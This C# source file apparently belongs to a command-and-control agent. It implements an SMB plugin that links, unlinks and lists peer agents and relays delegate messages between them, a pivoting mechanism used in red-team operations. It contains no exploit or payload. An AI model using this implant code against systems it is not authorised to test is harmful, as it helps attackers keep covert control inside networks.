using Agent.Interfaces;
using Agent.Models;
using System.Collections.Concurrent;
using System.Text;
using System.Text.Json;

namespace Agent
{
    public class Plugin : IPlugin, IForwarderPlugin
    {
        public string Name => "smb";
        private IAgentConfig config { get; set; }
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<string, SmbLink> forwarders = new ConcurrentDictionary<string, SmbLink>();
        private ConcurrentDictionary<string, SmbLink> tempForwarders = new ConcurrentDictionary<string, SmbLink>(); //Used to store before we know the "true" UUID of the fwd
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
        }

        public async Task Execute(ServerJob job)
        {
            SmbLinkArgs args = JsonSerializer.Deserialize<SmbLinkArgs>(job.task.parameters);
            if (args is null)
            {
                await messageManager.AddResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Invalid parameters.",
                    status = "error",
                    completed = true,
                });
                return;
            }

            switch (args.action)
            {
                case "link":
                    await CreateNewLink(args, job.task.id);
                    break;
                case "unlink":
                    if (await UnlinkForwarder(job.task.id))
                    {
                        await this.messageManager.AddResponse(new TaskResponse()
                        {
                            task_id = job.task.id,
                            user_output = "Link removed.",
                            status = "error",
                            completed = true,
                        });
                    }
                    else
                    {
                        await this.messageManager.AddResponse(new TaskResponse()
                        {
                            task_id = job.task.id,
                            user_output = "Failed to unlink.",
                            status = "error",
                            completed = true,
                        });

                    }
                    break;
                case "list":
                    await ListConnections(job);
                    break;
                default:
                    break;
            }
        }

        public async Task CreateNewLink(SmbLinkArgs args, string task_id)
        {
            string linkId = Guid.NewGuid().ToString();
            var link = new SmbLink(messageManager, logger, args, linkId, config.uuid, task_id);

            if(this.tempForwarders.TryAdd(linkId, link))
            {
                EdgeResponse err = await this.tempForwarders[linkId].Link();
                await this.messageManager.AddResponse(err.ToJson());
                return;
            }

            await this.messageManager.AddResponse(new TaskResponse()
            {
                task_id = task_id,
                user_output = "Link already exists.",
                status = "error",
                completed = true
            });
            
        }

        public async Task<bool> UnlinkForwarder(string linkId)
        {
            return await this.forwarders[linkId].Unlink() && this.forwarders.TryRemove(linkId, out _);
        }

        public async Task ForwardDelegate(DelegateMessage dm)
        {
            string id = dm.uuid;
            if (!string.IsNullOrEmpty(dm.new_uuid))
            {
                id = dm.new_uuid;
            }

            if (!forwarders.ContainsKey(dm.uuid)) //Check to see if it's a first message or not
            {
                SmbLink fwd;
                if (this.tempForwarders.TryRemove(dm.uuid, out fwd)) //Remove (hopefully) the only temporary forwarder we're looking for
                {
                    this.forwarders.TryAdd(dm.new_uuid, fwd);
                    this.forwarders[dm.new_uuid].linkId = dm.new_uuid;
                    dm.uuid = dm.new_uuid;
                }
            }

            await this.forwarders[id].ForwardDelegateMessage(dm);
        }

        public async Task ListConnections(ServerJob job)
        {
            StringBuilder sb = new StringBuilder();
            foreach (var fwdr in this.forwarders)
            {
                sb.AppendLine($"ID: {fwdr.Value.linkId}\tType: smb\tConnected: {fwdr.Value.connected}");
            }

            await this.messageManager.AddResponse(new TaskResponse()
            {
                user_output = sb.ToString(),
                task_id = job.task.id,
                completed = true,

            });
        }
    }
}
